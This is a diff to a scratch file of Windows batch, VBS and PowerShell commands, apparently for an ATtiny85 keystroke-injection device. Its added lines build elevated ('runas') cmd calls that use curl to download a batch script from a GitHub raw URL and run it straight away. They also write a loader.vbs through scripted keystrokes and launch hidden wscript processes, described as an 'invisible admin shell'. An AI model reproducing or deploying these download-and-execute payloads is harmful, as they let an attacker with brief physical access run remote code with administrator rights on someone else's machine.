@@ -6,21 +6,36 @@ setx DASH %=exitcodeAscii%
 [Environment]::SetEnvironmentVariable('DASH', $null, 'User')
 
 @rem set user locale (PowerShell)
-Set-WinUserLanguageList -LanguageList de-DE -force
+PowerShell Set-WinUserLanguageList -LanguageList de-DE -force
+
+@rem full_script.bat url: https://raw.githubusercontent.com/8AC2BC7E026226F2856A9DA8C4033927/attiny85-injection/main/injection/full_script.bat
 
 @rem .vbs script to run bat script (0: invisible, 1: visible)
 CreateObject("Shell.Application").ShellExecute "script.bat",,"","runas",1
+CreateObject("Shell.Application").ShellExecute "cmd","/k curl -m 10 --retry 20 -o output.bat SCRIPT_URL&full_script.bat","","runas",1
+
+CreateObject("Shell.Application").ShellExecute "cmd","/k cd %temp%&echo|set /p="curl -m 10 --retry 20 -o full_script.bat https://raw.githubusercontent.com/8AC2BC7E026226F2856A9DA8C4033927/attiny85-injection/main/injection/full_script.bat and full_script.bat","","runas",1
+
+win-run cmd /k %temp%&copy con loader.vbs
+CreateObject("Shell.Application").ShellExecute "cmd","/k curl -m 10 --retry 20 -o %temp%\script.bat https://raw.githubusercontent.com/8AC2BC7E026226F2856A9DA8C4033927/attiny85-injection/main/injection/full_script.bat&%temp%\script.bat","","runas",1
+Key: Enter
+Key: Ctrl+C
+loader.vbs
+exit
+
 
 @rem sample .bat script
 @echo off&set /p DUMMY=Hit ENTER to continue...
 
-@rem create invisible admin shell running .bat script
-cmd /k cd %temp%&echo|set /p="Visual Basic Script">script.vbs&echo|set /p="Batch Script">script.bat&script.vbs&exit
-
-cmd /k cd %temp% & echo CreateObject("Shell.Application").ShellExecute "script.bat",,"","runas",1>script.vbs & echo set /p DUMMY=Hit ENTER to continue...>script.bat & script.vbs & exit
+@rem create invisible admin shell running fetching and running .bat script
+cmd /k cd %temp%&echo|set /p="VBS_SCRIPT">script.vbs&script.vbs&exit
 
 Powershell -Command cd %temp% | echo "this is a test" > test.txt
 Powershell -Command Start-Process C:\Users\wanja\Documents\Arduino\cmd\test.bat -Verb RunAs
 Powershell -Windowstyle Hidden -Command Start-Process wscript.exe -ArgumentList "C:\Users\wanja\Documents\Arduino\cmd\invisible.vbs C:\Users\wanja\Documents\Arduino\cmd\test.bat"
 
 cmd /k cd %temp%&echo|set /p="CreateObject("Shell.Application").ShellExecute "script.bat",,"","runas",1">script.vbs&echo set /p DUMMY=Hit ENTER to continue...>script.bat&script.vbs&exit
+
+
+
+Powershell (New-Object System.Media.SoundPlayer "$env:windir\Media\tada.wav").PlaySync()
